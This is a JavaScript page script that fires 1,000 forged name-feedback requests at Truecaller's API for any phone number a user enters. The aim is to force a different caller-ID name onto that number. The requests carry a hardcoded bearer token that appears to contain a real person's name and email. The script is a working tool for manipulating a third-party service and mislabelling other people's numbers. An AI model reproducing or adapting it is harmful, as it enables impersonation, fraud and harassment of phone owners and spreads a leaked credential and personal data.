let num;
let suggestedName;

let butt = document.querySelector("button");
butt.addEventListener("click", function () {
  num = document.querySelector("#num").value;
  suggestedName = document.querySelector("#name").value;
  if (num !== "" && suggestedName !== "") {
    for (let i = 0; i < 1000; i++) {
      fetch(
        "https://asia-south1-truecaller-web.cloudfunctions.net/api/noneu/nameFeedback/v1",
        {
          headers: {
            accept: "application/json",
            "accept-language": "en-US,en;q=0.9,ar;q=0.8",
            authorization:
              "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODQwMjE4ODgzMzgsInRva2VuIjoiYTF3MFMtLWNSMkN3ckZtVk5JLTJMcU1jMWZTQ0hfZWREN08wNmNHUWg4TVMwNmZUaHZvWjlLZVZYNmxUZjJrNSIsImVuaGFuY2VkU2VhcmNoIjp0cnVlLCJjb3VudHJ5Q29kZSI6ImVnIiwibmFtZSI6IkVoYWIgTWFuc291ciIsImVtYWlsIjoibWFuc2VoYWI5OTlAZ21haWwuY29tIiwiaW1hZ2UiOiJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BR05teXhacGlvS2xjX2xVb2xXNHlUSkJRYXR3RVNqRkhUR0ZOeExBWjUxNT1zOTYtYyIsImlhdCI6MTY4MTQyOTg4OH0.H4XoQdS7OmlTfq52U7scKb91ymx3lHy41sxt-qAlNMw",
            "content-type": "application/json",
            "sec-ch-ua":
              '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
          },
          referrer: "https://www.truecaller.com/",
          referrerPolicy: "strict-origin-when-cross-origin",
          body: `{"entries":[{"phone":"${num}","feedback":1,"name":"","source":1,"ne_version":"20210210","suggestion":"${suggestedName}","suggestion_type":1}]}`,
          method: "POST",
          mode: "cors",
          credentials: "include",
        }
      );
    }
    Swal.fire(
      "Good job!",
      "Name has been changed, wait about 15 minutes",
      "success"
    );
  } else {
    Swal.fire({
      icon: "error",
      text: "Enter name and number",
    });
  }
});
